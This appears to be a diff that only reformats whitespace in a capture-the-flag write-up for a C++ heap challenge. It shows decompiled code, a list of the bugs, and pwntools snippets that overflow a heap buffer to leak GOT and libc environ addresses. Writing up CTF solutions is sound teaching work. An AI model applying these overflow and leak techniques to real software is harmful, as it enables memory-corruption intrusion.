@@ -48,30 +48,30 @@ After that, it will `operator.new()` which similar to malloc(). Cock and Owl wil
 void __thiscall Parrot::Parrot(Parrot *this)
 
 {
-	char *pcVar1;
+    char *pcVar1;
 
-	// Inherit of bird
-	Bird::Bird((Bird *)this);
-	
-	// Add parrot:sing address to chunk
-	*(undefined ***)this = &PTR_sing_00604d08;
+    // Inherit of bird
+    Bird::Bird((Bird *)this);
+    
+    // Add parrot:sing address to chunk
+    *(undefined ***)this = &PTR_sing_00604d08;
 
-	// Add buffer address
-	// buffer address = curent heap address + 0x18
-	std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
-			((basic_string<char,std::char_traits<char>,std::allocator<char>> *)(this + 8));
+    // Add buffer address
+    // buffer address = curent heap address + 0x18
+    std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string
+            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)(this + 8));
 
     // cout << "Pls talk: ";
     std::operator<<((basic_ostream *)std::cout,"Pls talk: ");
     
     // Get the buffer
     pcVar1 = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::
-			data((basic_string<char,std::char_traits<char>,std::allocator<char>> *)(this + 8)
+            data((basic_string<char,std::char_traits<char>,std::allocator<char>> *)(this + 8)
                        );
 
     // cin >> pcVar1;
-	std::operator>>((basic_istream *)std::cin,pcVar1);
-	return;
+    std::operator>>((basic_istream *)std::cin,pcVar1);
+    return;
 }
 ```
 
@@ -90,15 +90,10 @@ The address `0x0000000000604d08` contains parrot::sing address `0x00000000004028
 The fifth function is dismiss, which will free() the chunk and set `cage[index]=0` so there is no use after free.
 
 - Summary all bugs:
-
   1. Heap Buffer Overflow
-
   2. cin will auto add null byte at the end of user input
-
   3. Sing() will execute function inside a parent address
-
   4. Sing() will print out the data until null byte or space
-
   5. `cage` is a global variable
 
 # 2. Idea
@@ -139,23 +134,23 @@ We will makes some functions to help us exploit more convinient:
 
 ```
 def capture(index, bird, talk=''):
-	data = 'capture ' + str(index) + ' ' + bird
-	p.sendlineafter(b'>', data.encode())
-	if bird=='parrot':
-		p.sendlineafter(b'Pls talk:', talk)
+    data = 'capture ' + str(index) + ' ' + bird
+    p.sendlineafter(b'>', data.encode())
+    if bird=='parrot':
+        p.sendlineafter(b'Pls talk:', talk)
 
 def sing(index):
-	p.sendlineafter(b'>', 'sing {}'.format(index).encode())
-	return p.recvuntil(b'>')
+    p.sendlineafter(b'>', 'sing {}'.format(index).encode())
+    return p.recvuntil(b'>')
 
 def dismiss(index):
-	p.sendlineafter(b'>', 'dismiss {}'.format(index).encode())
+    p.sendlineafter(b'>', 'dismiss {}'.format(index).encode())
 
 def list():
-	p.sendlineafter(b'>', b'list')
+    p.sendlineafter(b'>', b'list')
 
 def leave():
-	p.sendlineafter(b'>', b'leave')
+    p.sendlineafter(b'>', b'leave')
 ```
 
 </p>
@@ -194,7 +189,7 @@ So now how we recover the address contain parrot::sing `0x0000000000604d08`? Wel
 ```
 parrot_sing_got = 0x0000000000604d08
 for i in range(1, 6):
-	capture(0, 'parrot', b'0'*(0x20-i))
+    capture(0, 'parrot', b'0'*(0x20-i))
 capture(0, 'parrot', b'0'*0x18 + p32(parrot_sing_got))
 ```
 
@@ -241,7 +236,7 @@ alarm_got = 0x00000000006050d8
 p.sendline(b'capture 0 parrot')
 p.sendlineafter(b'Pls talk:', b'0'*0x20 + p64(alarm_got))
 for i in range(1, 6):
-	capture(0, 'parrot', b'0'*(0x20-i))
+    capture(0, 'parrot', b'0'*(0x20-i))
 capture(0, 'parrot', b'0'*0x18 + p32(parrot_sing_got))
 
 alarm_addr = u64(sing(1)[1:-2] + b'\x00\x00')
@@ -266,7 +261,7 @@ And the place which always contains stack address is libc environ:
 p.sendline(b'capture 0 parrot')
 p.sendlineafter(b'Pls talk:', b'0'*0x20 + p64(libc.sym['environ']))
 for i in range(1, 6):
-	capture(0, 'parrot', b'0'*(0x20-i))
+    capture(0, 'parrot', b'0'*(0x20-i))
 capture(0, 'parrot', b'0'*0x18 + p32(parrot_sing_got))
 
 stack_leak = u64(sing(1)[1:-2] + b'\x00\x00')
